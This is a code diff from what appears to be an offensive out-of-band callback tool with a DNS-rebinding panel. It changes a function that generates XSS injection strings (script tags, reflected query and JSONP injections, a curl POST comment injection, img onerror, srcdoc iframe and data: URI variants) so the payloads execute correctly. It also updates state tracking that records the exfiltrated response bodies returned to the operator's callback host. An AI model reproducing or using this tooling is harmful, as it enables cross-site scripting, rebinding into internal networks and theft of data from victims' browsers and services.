@@ -167,27 +167,58 @@ function buildRebindPayload(
 })();`.trim();
 }
 
+function htmlEscape(s: string): string {
+  return s
+    .replace(/&/g, "&amp;")
+    .replace(/"/g, "&quot;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+}
+
 function buildRebindInjectionCmds(
   targetUrl: string,
   payload: string,
   cbUrl: string,
 ): Record<string, string> {
-  const enc = encodeURIComponent(payload);
+  // URL-encode only for query param values — never inside <script> body
+  const payloadUrlEncoded  = encodeURIComponent(payload);
+  // HTML-escape for attribute contexts (srcdoc, onerror)
+  const payloadHtmlEscaped = htmlEscape(payload);
+  // For srcdoc, the attribute value is parsed as HTML so we HTML-encode
+  // the script content inside the srcdoc HTML document
+  const srcdocInner = `&lt;script&gt;${htmlEscape(payload)}&lt;/script&gt;`;
+  // data: URI content is percent-encoded but the JS inside must be raw
+  const dataUriPayload = encodeURIComponent(`<script>${payload}<\/script>`);
+
   return {
     script_tag:
       `<script>${payload}<\/script>`,
+
+    // Reflected XSS: inject raw script tag into a query param the server echoes
     xss_url_inject:
-      `${targetUrl}?q=<script>${enc}<\/script>`,
+      `${targetUrl}?q=<script>${payload}<\/script>`,
+
+    // POST body injection — e.g. comment field that gets reflected in response
     curl_post_inject:
-      `curl -sk -X POST '${targetUrl}' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode "comment=${payload}"`,
+      `curl -sk -X POST '${targetUrl}' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data-urlencode "comment=<script>${payload}<\/script>"`,
+
+    // img onerror: payload runs as JS in the onerror attribute (HTML-escaped)
     img_onerror:
-      `<img src=x onerror="${payload.replace(/"/g, "&quot;")}">`,
+      `<img src=x onerror="${payloadHtmlEscaped}">`,
+
+    // srcdoc iframe: srcdoc attribute is HTML; inner tags need HTML entity encoding
     srcdoc_iframe:
-      `<iframe srcdoc="<script>${enc}<\/script>">`,
+      `<iframe srcdoc="${srcdocInner}"></iframe>`,
+
+    // JSONP: server reflects the callback name into JS — inject raw script close + new script
     jsonp_callback:
-      `${targetUrl}?callback=<script>${enc}<\/script>`,
+      `${targetUrl}?callback=x;${payloadUrlEncoded}//`,
+
+    // data: URI with full HTML page containing the script
     link_tag_import:
-      `<link rel=import href='data:text/html,<script>${enc}<\/script>'>`,
+      `<link rel=import href='data:text/html,${dataUriPayload}'>`,
+
+    // Watch for incoming OOB callbacks for this token via SSE
     watch_cb:
       `# Watch for incoming callback on token:\ncurl -N '${cbUrl.replace(/\/cb\/.*$/, "/hits/stream")}'`,
   };
@@ -235,17 +266,34 @@ export default function OobPanel() {
       setLastHitTime(Date.now());
       setFlash(hit.id);
       setTimeout(() => setFlash(f => f === hit.id ? null : f), 800);
-      // Update rebind session phase from OOB hit
+      // Update rebind session phase from OOB hit — monotonic transitions only.
+      // Once exfil is reached it cannot be overwritten. Error can only override
+      // pre-exfil phases. All other phases advance by rank only.
       setRebindStatus(prev => {
         if (!prev || hit.token !== prev.token) return prev;
-        const phase = (hit.query["phase"] ?? "") as string;
+        const RANK: Record<RebindPhase, number> = {
+          idle: 0, armed: 1, arm_hit: 2, rebind_wait: 3, error: 3, exfil: 4,
+        };
+        const cur   = prev.phase;
+        const oobPhase = (hit.query["phase"] ?? "") as string;
         const data  = hit.decodedData ?? tryDecode(hit.query["d"] ?? "").text;
-        if (phase === "arm")          return { ...prev, phase: "arm_hit",     armTs: Date.now() };
-        if (phase === "rebind_fetch") return { ...prev, phase: "rebind_wait" };
-        if (phase === "exfil" || phase === "exfil_xhr")
+
+        // exfil is a terminal success state — never overwrite it
+        if (cur === "exfil") return prev;
+
+        if (oobPhase === "arm" && RANK["arm_hit"] > RANK[cur]) {
+          return { ...prev, phase: "arm_hit", armTs: Date.now() };
+        }
+        if (oobPhase === "rebind_fetch" && RANK["rebind_wait"] > RANK[cur]) {
+          return { ...prev, phase: "rebind_wait" };
+        }
+        if ((oobPhase === "exfil" || oobPhase === "exfil_xhr") && RANK["exfil"] > RANK[cur]) {
           return { ...prev, phase: "exfil", exfilTs: Date.now(), responseBody: data };
-        if (phase === "error" || phase === "error_xhr")
+        }
+        // error can replace any non-exfil phase (exfil already guarded above) but doesn't regress arm_hit → armed
+        if ((oobPhase === "error" || oobPhase === "error_xhr") && RANK[cur] >= RANK["arm_hit"]) {
           return { ...prev, phase: "error", errorMsg: data };
+        }
         return prev;
       });
     } else if (m["type"] === "dns_session") {
